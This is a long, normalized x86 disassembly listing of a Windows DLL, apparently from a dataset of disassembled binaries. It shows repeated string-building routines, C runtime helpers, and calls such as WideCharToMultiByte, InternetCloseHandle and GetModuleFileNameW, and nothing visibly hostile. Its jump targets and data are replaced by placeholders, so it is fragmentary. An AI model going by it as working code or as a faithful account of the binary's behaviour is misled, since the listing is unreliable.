push edx
call sub_1000a86e
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xd8 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x1d
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0xe0 ]
mov eax 0x11
call sub_10018dc0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xe0 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x1e
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x178 ]
mov eax 0x14
call sub_10018dc0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x178 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x1f
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x198 ]
mov eax 0x1e
call sub_10018dc0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x198 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x20
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x1a0 ]
mov eax 0x4e
call sub_10018dc0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x1a0 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x21
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x90 ]
mov eax 0x63
call sub_10018dc0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x90 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x22
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x100 ]
mov eax 0x32
call sub_10018dc0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x100 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x23
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x128 ]
mov eax 0xd
call sub_10018dc0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x128 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x24
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x1a8 ]
mov eax 0x31
call sub_10018dc0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x1a8 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x25
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x19c ]
mov eax 0xb
call sub_10018dc0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x19c ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x26
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x98 ]
mov eax 0x1a
call sub_10018dc0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x98 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x27
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x118 ]
mov eax 0x42
call sub_10018dc0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x118 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x28
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0xe8 ]
mov eax 0x50
call sub_10018dc0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xe8 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x29
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0xf8 ]
mov eax 0x1
call sub_10018dc0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xf8 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2a
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0xa0 ]
mov eax 0x3b
call sub_10018dc0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0xa0 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2b
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x1a4 ]
mov eax 0x1f
call sub_10018dc0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x1a4 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2c
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x138 ]
mov eax 0x3f
call sub_10018dc0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x138 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2d
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x88 ]
mov eax 0x38
call sub_10018dc0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x88 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2e
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x110 ]
mov eax 0x20
call sub_10018dc0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x110 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x2f
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x120 ]
mov eax 0x27
call sub_10018dc0
mov eax edi
mov [ ebp - 0x140 ] 0xf
mov [ ebp - 0x144 ] ebx
mov [ ebp - 0x154 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x120 ]
push eax
lea ecx [ ebp - 0x154 ]
call sub_1003e780
lea ecx [ ebp - 0x154 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x30
call sub_1005ef00
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x140 ] 0x10
jb r-xdata
lea edi [ ebp - 0x108 ]
mov eax 0x2
call sub_10018dc0
mov eax edi
mov [ ebp - 0x15c ] 0xf
mov [ ebp - 0x160 ] ebx
mov [ ebp - 0x170 ] bl
lea edx [ eax + 0x1 ]
jmp r-xdata
mov edx [ ebp - 0x154 ]
push edx
call sub_1000a86e
add esp 0x4
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
push eax
lea eax [ ebp - 0x108 ]
push eax
lea ecx [ ebp - 0x170 ]
call sub_1003e780
lea ecx [ ebp - 0x170 ]
push ecx
mov ecx esi
mov [ ebp - 0x4 ] 0x31
call sub_1005ef00
cmp [ ebp - 0x15c ] 0x10
jb r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x170 ]
push edx
call sub_1000a86e
add esp 0x4
sub_10063545
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x14 ]
push esi
push edi
test eax eax
jne r-xdata
mov esi [ eax ]
mov edi [ eax + 0x4 ]
call sub_1006e175
mov esi [ eax + 0x8 ]
call sub_1002f5d0
mov edi eax
jmp r-xdata
and [ ebp + 0x14 ] 0x0
push edi
call sub_10045308
pop ecx
lea ecx [ ebp + 0x14 ]
push ecx
push 0x0
push eax
call sub_1003d06d
pop ecx
push eax
push [ ebp + 0x8 ]
lea eax [ ebp + 0xc ]
push 0x1
push eax
push 0x0
push edi
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov ax [ ebp + 0xc ]
mov ecx 0xff
cmp ax cx
ja r-xdata
test esi esi
jne r-xdata
call sub_1005b670
mov [ eax ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0x14 ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] al
xor eax eax
inc eax
jmp r-xdata
pop edi
pop esi
pop ebp
retn
sub_100635e8
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
cmp [ ebp + 0x10 ] 0x0
push ebx
push esi
push edi
je r-xdata
xor eax eax
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_10051cf5
mov ebx [ ebp + 0x8 ]
test ebx ebx
jne r-xdata
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
cmp [ ebp - 0x4 ] 0x0
je r-xdata
mov edi 0x7fffffff
cmp [ ebp + 0x10 ] edi
jbe r-xdata
mov eax 0x7fffffff
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov eax [ ebp - 0x10 ]
cmp [ eax + 0x14 ] 0x0
jne r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
cmp [ ebp - 0x4 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
sub ebx esi
push [ ebp + 0x10 ]
push esi
push ebx
call sub_100821a0
add esp 0xc
mov eax edi
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub edi eax
mov eax edi
jmp r-xdata
test edi edi
je r-xdata
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp edi eax
je r-xdata
movzx eax [ ebx + esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1000498f
mov edi eax
movzx eax [ esi ]
lea ecx [ ebp - 0x10 ]
push ecx
push eax
call sub_1000498f
add esp 0x10
inc esi
dec [ ebp + 0x10 ]
je r-xdata
sub_100636ca
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push [ ebp + 0x10 ]
lea ecx [ ebp - 0x10 ]
call sub_10051cf5
mov eax [ ebp + 0x8 ]
xor ebx ebx
cmp eax ebx
jne r-xdata
push esi
mov esi [ ebp - 0xc ]
cmp [ esi + 0x8 ] ebx
jne r-xdata
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
cmp [ ebp - 0x4 ] bl
je r-xdata
movzx ecx [ eax ]
cmp cx bx
jne r-xdata
push [ ebp + 0xc ]
push eax
call sub_1007f250
pop ecx
pop ecx
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
movzx edx cl
test [ edx + esi + 0x1d ] 0x4
je r-xdata
movzx ecx cx
cmp [ ebp + 0xc ] ecx
jne r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop ebx
leave
retn
movzx edx cx
cmp [ ebp + 0xc ] edx
je r-xdata
inc eax
mov dl [ eax ]
cmp dl bl
je r-xdata
cmp [ ebp - 0x4 ] bl
je r-xdata
pop esi
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
jmp r-xdata
inc eax
movzx ecx cx
movzx edx dl
shl ecx 0x8
or ecx edx
cmp [ ebp + 0xc ] ecx
jne r-xdata
xor eax eax
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
dec eax
jmp r-xdata
sub_10063780
push esi
mov esi ecx
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov eax [ esi ]
test eax eax
je r-xdata
push eax
push 0x0
call [ GetProcessHeap@IAT ]
push eax
call [ HeapFree@IAT ]
mov [ esi + 0x4 ] 0x0
mov [ esi ] 0x0
pop esi
retn
push eax
call [ InternetCloseHandle@IAT ]
sub_100637b6
mov edi edi
push ebp
mov ebp esp
push esi
mov esi ecx
mov ecx [ esi + 0x4 ]
test ecx ecx
je r-xdata
mov [ esi ] 0x1
push [ ebp + 0x8 ]
call sub_10071b72
cmp eax 0xffffffff
jne r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
sub_10063800
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x8 ]
push eax
mov [ esi ] r--data
call sub_10019274
mov ecx [ esi + 0x10 ]
push ecx
call sub_10019274
mov edx [ esi + 0x14 ]
push edx
call sub_10019274
add esp 0xc
test [ ebp + 0x8 ] 0x1
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
pop ebp
retn 0x4
push esi
call sub_1000a86e
add esp 0x4
sub_10063850
push ebp
mov ebp esp
sub esp 0x220
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push ebx
mov ebx ecx
test ebx ebx
je r-xdata
mov ecx [ ebp - 0x4 ]
xor ecx ebp
mov eax 0x1
pop ebx
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax [ rw-data ]
test eax eax
jne r-xdata
push 0x104
lea ecx [ ebp - 0x220 ]
push ecx
push eax
call [ GetModuleFileNameW@IAT ]
test eax eax
jne r-xdata
mov eax 0x2
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x220 ]
push edx
call [ PathRemoveFileSpecW@IAT ]
lea eax [ ebp - 0x220 ]
push eax
call [ PathAddBackslashW@IAT ]
lea edx [ ebp - 0x18 ]
mov eax 0x6e
call sub_10069020
lea ecx [ ebp - 0x220 ]
push ecx
push ebx
mov ecx 0x104
call sub_10012950
test eax eax
je r-xdata
mov eax 0x3
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
push esi
lea edx [ ebp - 0x18 ]
push edx
mov esi 0x104
call sub_10050c60
neg eax
sbb eax eax
pop esi
and eax 0x5
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
mov eax 0x4
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_10032529
mov esp ebp
pop ebp
retn
sub_10063950
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
test eax eax
je r-xdata
pop esi
pop ebp
retn
cmp [ eax + 0x1 ] 0x2f
push edi
lea edi [ eax + 0x1 ]
jne r-xdata
add [ esi + 0x4 ] 0xfffffffe
mov eax [ esi + 0x4 ]
add eax edi
mov [ esi ] edi
cmp edi eax
je r-xdata
add eax 0x2
add [ esi + 0x4 ] 0xfffffffd
pop edi
mov [ esi ] eax
pop esi
pop ebp
retn
pop edi
movsx eax [ edi ]
push eax
call sub_10002c6e
add esp 0x4
test eax eax
jne r-xdata
sub edi [ esi ]
mov [ esi + 0x4 ] edi
cmp [ edi ] 0x2f
je r-xdata
mov ecx [ esi ]
add ecx [ esi + 0x4 ]
inc edi
cmp edi ecx
jne r-xdata
pop edi
pop esi
pop ebp
retn
sub_100639cf
push 0x38
mov eax sub_1008571a
call sub_10047689
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov edi [ ebp + 0x20 ]
mov ebx [ ebp + 0x24 ]
and [ ebp - 0x38 ] 0x0
mov [ ebp - 0x40 ] eax
lea eax [ ebp - 0x3c ]
mov [ ebp - 0x34 ] ecx
push eax
mov ecx esi
call sub_10007a10
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x34 ]
call sub_1004ad92
or [ ebp - 0x4 ] 0xffffffff
add esp 0x18
lea ecx [ ebp - 0x3c ]
mov esi eax
call sub_1002be90
cmp [ ebp - 0x30 ] 0x2d
lea eax [ ebp - 0x2f ]
je r-xdata
mov [ ebp - 0x34 ] eax
lea eax [ ebp - 0x38 ]
push eax
push esi
lea eax [ ebp - 0x44 ]
push eax
push [ ebp - 0x34 ]
call sub_10046885
mov esi eax
add esp 0x10
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
mov eax [ ebp - 0x34 ]
cmp [ ebp - 0x44 ] eax
je r-xdata
or [ edi ] 0x1
or [ edi ] 0x2
cmp [ ebp - 0x38 ] 0x0
jne r-xdata
cmp esi 0xffffffff
ja r-xdata
cmp [ ebp - 0x30 ] 0x2d
jne r-xdata
mov [ ebx ] esi
jmp r-xdata
neg esi
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x40 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
call sub_100262c3
retn 0x20
sub_10063a9a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
mov eax [ eax + 0x10 ]
pop ebp
retn
call sub_1005b670
mov [ eax ] 0x16
call sub_1004b131
or eax 0xffffffff
pop ebp
retn
sub_10063b00
push ebp
mov ebp esp
and esp 0xfffffff8
sub esp 0x54
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x50 ] eax
mov edx [ ebp + 0x1c ]
push ebx
mov ebx [ ebp + 0x14 ]
mov eax [ ebx + 0x14 ]
push esi
push edi
mov edi [ ebp + 0x8 ]
mov esi ecx
mov ecx [ ebp + 0x20 ]
push ecx
push edx
push eax
push r--data
lea eax [ esp + 0x20 ]
push eax
push esi
call sub_10048610
add esp 0x10
push eax
lea ecx [ esp + 0x24 ]
push 0x40
push ecx
call sub_1000f103
mov ecx [ ebp + 0x10 ]
push eax
mov eax [ ebp + 0x18 ]
lea edx [ esp + 0x30 ]
push edx
mov edx [ ebp + 0xc ]
push eax
push ebx
push ecx
push edx
push edi
push esi
call sub_10012150
mov ecx [ esp + 0x90 ]
add esp 0x34
mov eax edi
pop edi
pop esi
pop ebx
xor ecx esp
call sub_10032529
mov esp ebp
pop ebp
retn 0x1c
sub_10063b90
push esi
mov esi ecx
test [ esi + 0x40 ] 0x1
mov [ esi ] r--data
je r-xdata
mov edx [ esi + 0x10 ]
mov [ edx ] 0x0
mov eax [ esi + 0x20 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x30 ]
mov [ ecx ] 0x0
mov edx [ esi + 0x14 ]
mov [ edx ] 0x0
mov eax [ esi + 0x24 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x34 ]
mov [ ecx ] 0x0
and [ esi + 0x40 ] 0xfffffffe
mov [ esi + 0x3c ] 0x0
mov ecx esi
pop esi
jmp sub_100033b0
mov eax [ esi + 0x10 ]
mov ecx [ eax ]
push ecx
call sub_1000a86e
add esp 0x4
sub_10063bf6
push 0x8
push r--data
call sub_1007fad0
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
call sub_1007fb15
retn
cmp [ ecx ] 0xe06d7363
jne r-xdata
mov eax [ ecx + 0x1c ]
test eax eax
je r-xdata
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
and [ ebp - 0x4 ] 0x0
push eax
push [ ecx + 0x18 ]
call sub_1003750d
mov [ ebp - 0x4 ] 0xfffffffe
sub_10063c4b
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
lea eax [ ebp - 0x4 ]
push eax
push 0x7f3
push 0x0
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
push ecx
call sub_1002f3fc
mov ecx [ ebp + 0x20 ]
or [ ecx ] eax
mov eax [ ecx ]
add esp 0x18
test al 0x2
jne r-xdata
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x4 ] ecx
leave
retn 0x20
push esi
mov esi [ ebp - 0x4 ]
mov edx 0x76c
cmp esi edx
jl r-xdata
cmp esi 0x87
jle r-xdata
sub esi edx
jmp r-xdata
mov eax [ ebp + 0x24 ]
mov [ eax + 0x14 ] esi
pop esi
or eax 0x2
mov [ ecx ] eax
sub_10063cb3
push 0x3c
mov eax sub_10085747
call sub_10047689
mov eax [ ebp + 0x8 ]
mov esi [ ebp + 0x1c ]
mov ebx [ ebp + 0x20 ]
mov edi [ ebp + 0x24 ]
and [ ebp - 0x34 ] 0x0
mov [ ebp - 0x3c ] eax
lea eax [ ebp - 0x38 ]
mov [ ebp - 0x44 ] ecx
push eax
mov ecx esi
call sub_10007a10
mov esi [ esi + 0x14 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x34 ]
push ecx
push eax
push esi
lea eax [ ebp + 0x14 ]
push eax
lea eax [ ebp + 0xc ]
push eax
lea eax [ ebp - 0x30 ]
push eax
push [ ebp - 0x44 ]
call sub_1006406d
add esp 0x18
push eax
lea eax [ ebp - 0x40 ]
push eax
lea eax [ ebp - 0x30 ]
push eax
call sub_1001927f
or [ ebp - 0x4 ] 0xffffffff
add esp 0x10
lea ecx [ ebp - 0x38 ]
mov esi eax
mov [ ebp - 0x44 ] edx
call sub_1002be90
lea eax [ ebp + 0x14 ]
push eax
lea ecx [ ebp + 0xc ]
call sub_1002839c
test al al
je r-xdata
lea eax [ ebp - 0x30 ]
cmp [ ebp - 0x40 ] eax
je r-xdata
or [ ebx ] 0x1
or [ ebx ] 0x2
